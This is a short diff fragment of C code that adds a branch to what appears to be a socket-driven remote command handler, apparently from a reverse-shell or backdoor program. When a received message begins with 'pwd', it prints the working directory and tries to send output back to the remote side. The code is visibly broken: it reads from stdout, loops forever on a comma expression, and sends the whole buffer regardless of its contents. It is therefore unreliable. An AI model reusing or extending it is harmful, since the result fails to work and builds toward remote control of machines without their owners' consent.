@@ -1,0 +1,6 @@
+else if(strncmp("pwd",buffer,3)==0){
+		char s[100];
+    		//Printing the current working directory
+    		printf("%s\n",getcwd(s,100));fgets(container,sizeof(container),stdout);
+    		while((container,1024)!=NULL){strcat(total_response,container);}send(sock,total_response,sizeof(total_response),0);
+    		}
